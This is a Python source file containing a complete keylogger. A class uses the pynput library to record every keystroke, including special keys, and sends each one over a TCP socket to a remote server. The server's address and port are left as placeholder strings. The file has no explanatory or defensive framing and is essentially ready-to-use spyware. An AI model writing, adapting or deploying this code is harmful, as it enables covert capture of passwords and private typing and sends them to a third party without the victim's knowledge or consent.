from pynput.keyboard import Listener
import socket

class Keylogger:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.client = None

    def start_socket(self):
        try:
            self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client.connect((self.ip, self.port))
        except socket.error as err:
            print(f"Socket creation error: {err}")

    def send_data(self, key):
        key = str(key).replace("'", "")
        try:
            self.client.send(key.encode('utf-8'))
        except socket.error as err:
            print(f"Failed to send data: {err}")

    def on_press(self, key):
        if str(key).find("Key.") == -1:
            self.send_data(key)
        else:
            self.send_data(f"special key {key}")

    def keylogger(self):
        self.start_socket()
        try:
            with Listener(on_press=self.on_press) as listener:
                listener.join()
        except Exception as err:
            print(f"Error in keyboard monitoring: {err}")
        finally:
            if self.client:
                self.client.close()

if __name__ == "__main__":
    ke = Keylogger("sever ip ", "server port")
    ke.keylogger()
